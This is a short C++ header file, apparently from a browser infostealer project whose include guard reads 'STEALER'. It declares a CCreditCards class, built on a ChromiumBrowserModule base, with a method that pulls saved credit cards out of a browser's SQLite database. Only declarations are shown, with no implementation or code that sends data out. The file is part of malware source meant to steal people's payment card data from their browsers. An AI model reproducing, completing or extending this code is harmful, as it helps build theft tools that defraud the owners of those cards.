//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CCREDITCARDS_H
#define STEALER_CCREDITCARDS_H


#include "sqlite3.h"
#include "../ChromiumBrowserModule.h"



class CCreditCards : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
private:
    std::list<CreditCard> getCreditCards(const fs::path &db_path);
};


#endif //STEALER_CCREDITCARDS_H
